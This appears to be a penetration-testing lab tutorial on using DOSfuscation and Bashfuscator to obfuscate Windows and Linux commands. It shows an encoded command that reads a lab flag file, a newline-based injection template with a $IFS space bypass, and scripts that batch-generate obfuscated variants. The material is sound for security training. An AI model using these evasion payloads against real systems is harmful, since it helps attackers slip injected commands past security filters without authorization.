# 🛰️ Introduction

Interactive tools for command obfuscation are essential in penetration testing to bypass security mechanisms that filter out suspicious commands. This document details how to use **DOSfuscation**, an interactive tool designed specifically for Windows environments, alongside a brief comparison with **Bashfuscator** for Linux/Unix systems.

## 🪟 Installation and Usage

### DOSfuscation

#### **Installation**

```powershell
# Clone the repository
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git

# Navigate to directory
cd Invoke-DOSfuscation

# Import the PowerShell module
Import-Module .\Invoke-DOSfuscation.psd1

# Launch the interactive tool
Invoke-DOSfuscation
```

#### **Interactive Usage**

**Help Menu:**
```powershell
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

**Tutorial Option:**
```powershell
Invoke-DOSfuscation> tutorial
```

### Practical Example

#### Step 1: Set Command
```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
```

#### Step 2: Choose Encoding
```powershell
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
...SNIP...
```

#### Step 3: Get Obfuscated Result
```powershell
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

### Testing Windows Obfuscation

#### Execute on Windows CMD:
```cmd
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

### Cross-Platform Testing

#### Linux PowerShell Alternative:
```bash
# Install PowerShell on Linux (if not available)
sudo apt update && sudo apt install -y powershell

# Run PowerShell
pwsh

# Follow the exact same commands from above
```

**Note:** This tool is installed by default in your **Pwnbox** instance.

---

## 🛠️ DOSfuscation Techniques

### Environment Variable Encoding

**How it Works:**
DOSfuscation uses Windows environment variables to construct characters:
```cmd
# Examples of character extraction:
%TEMP:~-3,-2%        # Extracts specific characters from TEMP variable
%CommonProgramFiles:~17,-11%  # Character extraction from program files path
%SystemRoot:~-4,-3%  # Extract from system root path
```

### Advanced Obfuscation Options

**Available Techniques:**
- **BINARY** - Obfuscated binary syntax for cmd.exe & powershell.exe
- **ENCODING** - Environment variable encoding
- **PAYLOAD** - Obfuscated payload via DOSfuscation

**Interactive Navigation:**
```powershell
# Navigate through options
Invoke-DOSfuscation> binary
Invoke-DOSfuscation\Binary> 1

# Return to main menu
Invoke-DOSfuscation\Binary> back
Invoke-DOSfuscation>
```

---

## 📚 Tool Comparison

### Bashfuscator vs DOSfuscation

| Feature | Bashfuscator | DOSfuscation |
|---------|--------------|--------------|
| **Platform** | Linux/Unix | Windows |
| **Interface** | Command-line | Interactive |
| **Output Size** | Variable (100-1M+ chars) | Moderate (50-200 chars) |
| **Customization** | High (many flags) | Medium (preset options) |
| **Ease of Use** | Moderate | High (guided) |
| **Techniques** | Multiple layers | Env var extraction |

### When to Use Each Tool

**Use Bashfuscator when:**
- ✅ Targeting Linux/Unix systems
- ✅ Need highly customized obfuscation
- ✅ Multiple obfuscation layers required
- ✅ Automated scripting needed

**Use DOSfuscation when:**
- ✅ Targeting Windows systems
- ✅ Need environment variable techniques
- ✅ Interactive exploration preferred
- ✅ Moderate obfuscation sufficient

---

## 🎲 Practical Integration

### Web Application Testing Workflow

#### Step 1: Generate Obfuscated Payload
```bash
# Linux target
./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1

# Windows target
# Use DOSfuscation interactively
```

#### Step 2: Filter Adaptation
```bash
# Replace spaces with filter-safe alternatives
# Original: eval "$(command)"
# Modified: eval$IFS"$(command)"
```

#### Step 3: Web Injection
```http
# Combine with injection operators
ip=127.0.0.1%0a[OBFUSCATED_COMMAND]
```

### Automation Scripts

**Bashfuscator Automation:**
```bash
#!/bin/bash
# Auto-generate multiple obfuscation variants
for cmd in "whoami" "id" "pwd"; do
    echo "=== Obfuscating: $cmd ==="
    ./bashfuscator -c "$cmd" -s 1 -t 1 --no-mangling --layers 1
    echo
done
```

**PowerShell Automation (DOSfuscation):**
```powershell
# Batch obfuscation script
$commands = @("whoami", "dir", "type flag.txt")
foreach ($cmd in $commands) {
    Write-Host "=== Obfuscating: $cmd ==="
    # Manual DOSfuscation process would go here
}
```

---

## 🔍 Advanced References

### Additional Resources

For more advanced obfuscation methods, refer to:
- **Secure Coding 101: JavaScript module** - Advanced obfuscation methods
- **PayloadsAllTheThings** - Community obfuscation techniques
- **OWASP Testing Guide** - Injection testing methodologies

### Tool Updates

**Stay Current:**
- ⚠️ Tools may require updates for new OS versions
- ⚠️ Signature detection evolves constantly
- ⚠️ New techniques emerge regularly

**Best Practices:**
- ✅ Test obfuscated payloads before deployment
- ✅ Have multiple obfuscation options ready
- ✅ Combine manual and automated techniques
- ✅ Keep tools updated to latest versions

---

## 🎯 Key Takeaways

### **Automated Advantages**

- 🚀 **Speed** - Rapid payload generation
- 🔄 **Consistency** - Reliable obfuscation patterns
- 🎯 **Variety** - Multiple technique options
- 🛠️ **Customization** - Tunable parameters

### **Integration Strategy**

- 🔍 **Assessment** - Identify filter sophistication
- 🛠️ **Tool Selection** - Choose appropriate platform tool
- 🎭 **Obfuscation** - Generate automated payloads
- 🔧 **Adaptation** - Modify for specific filters
- ⚡ **Execution** - Deploy via injection vectors

These automated evasion tools provide penetration testers with powerful capabilities to bypass sophisticated filtering mechanisms while maintaining efficiency and effectiveness in assessments.